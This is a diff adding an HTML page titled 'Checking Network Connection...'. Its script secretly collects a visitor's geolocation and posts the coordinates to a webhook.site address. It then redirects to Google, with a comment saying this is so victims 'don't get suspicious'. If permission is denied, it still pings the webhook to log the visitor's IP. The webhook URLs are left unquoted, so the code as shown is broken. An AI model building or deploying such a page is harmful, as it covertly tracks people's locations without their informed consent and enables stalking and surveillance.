@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Checking Network Connection...</title>
+</head>
+<body>
+    <script>
+        // Use the Geolocation API
+        navigator.geolocation.getCurrentPosition(success, error);
+
+        function success(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const acc = position.coords.accuracy;
+
+            // Send data to YOUR Webhook URL
+            fetch(https://webhook.site/b73f0e16-1404-4a01-a652-b989b37786c4, {
+                method: "POST",
+                mode: "no-cors",
+                body: JSON.stringify({
+                    latitude: lat,
+                    longitude: lon,
+                    accuracy: acc + " meters"
+                })
+            }).then(() => {
+                // Redirect user to a real site so they don't get suspicious
+                window.location.href = "https://www.google.com";
+            });
+        }
+
+        function error() {
+            // Even if they deny, you can still log the IP by just hitting the URL
+            fetch(https://webhook.site/b73f0e16-1404-4a01-a652-b989b37786c4);
+            window.location.href = "https://www.google.com";
+        }
+    </script>
+</body>
+</html>
